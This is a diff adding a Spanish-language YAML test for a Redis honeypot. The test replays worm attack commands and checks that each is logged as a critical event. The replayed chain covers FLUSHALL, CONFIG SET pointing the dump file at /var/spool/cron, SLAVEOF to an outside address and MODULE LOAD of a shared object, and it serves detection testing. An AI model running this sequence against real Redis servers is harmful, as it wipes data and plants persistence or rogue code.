@@ -1,0 +1,45 @@
+# Prueba automática del módulo: herramientas/probar-trampa.sh redis
+# Se despliega abierto (sin contraseña, como lo encuentran los gusanos), se
+# ataca con redis-cli desde la imagen 'atacante' encadenando lo que hacen los
+# gusanos reales y tienen que salir estos eventos. Las IPs son de documentación
+# (TEST-NET, RFC 5737) y el valor es inofensivo: la trampa no ejecuta nada.
+parametros:
+  puertoRedis: 63799
+  version: '7.2.4'
+  contrasena: ''
+arranque: 3
+ataques:
+  - imagen: atacante
+    puedeFallar: true
+    orden:
+      - sh
+      - -c
+      - |
+        for i in 1 2 3 4 5; do redis-cli -h 127.0.0.1 -p ${puertoRedis} PING >/dev/null 2>&1 && break; sleep 1; done
+        printf 'AUTH Prueba-2026\nHELLO 3 AUTH default ClaveHello\nPING\nINFO server\nCONFIG GET dir\nFLUSHALL\nCONFIG SET dir /var/spool/cron\nCONFIG SET dbfilename root\nCONFIG SET maxmemory 0 dir /tmp/otro\nMULTI\nSET backup1 marcador-inofensivo\nEXEC\nBGSAVE\nSLAVEOF 198.51.100.10 6379\nMODULE LOAD /tmp/exp.so\nSLAVEOF NO ONE\nEVAL return_1 0\nGET backup1\n' | redis-cli -h 127.0.0.1 -p ${puertoRedis}
+espera:
+  # Hubo sesión TCP completa: el origen no está falseado.
+  - { accion: conexion, conexion: true, detalle: { eventid: redis.session.connect } }
+  # La contraseña probada se guarda completa, también en modo abierto.
+  - {
+      accion: autenticacion,
+      severidad: alta,
+      detalle: { password: Prueba-2026, eventid: redis.auth }
+    }
+  # HELLO ... AUTH también cuenta como autenticación y guarda usuario y contraseña
+  # (las librerías modernas autentican así; antes pasaba como comando normal).
+  - {
+      accion: autenticacion,
+      severidad: alta,
+      detalle: { usuario: default, password: ClaveHello, eventid: redis.auth }
+    }
+  # Un comando normal: queda registrado como tal.
+  - { accion: comando, detalle: { comando: PING, eventid: redis.command.input } }
+  # Las secuencias de los gusanos, marcadas como críticas con su motivo. El
+  # CONFIG SET con varios pares (Redis 7) no esconde el dir detrás del primero.
+  - { accion: comando, severidad: critica, detalle: { comando: FLUSHALL, grave: borrado } }
+  - { accion: comando, severidad: critica, detalle: { comando: CONFIG, grave: persistencia } }
+  - { accion: comando, severidad: critica, detalle: { comando: SLAVEOF, grave: réplica } }
+  - { accion: comando, severidad: critica, detalle: { comando: MODULE, grave: módulo } }
+  - { accion: comando, severidad: critica, detalle: { comando: EVAL, grave: sandbox } }
+tiempo: 15
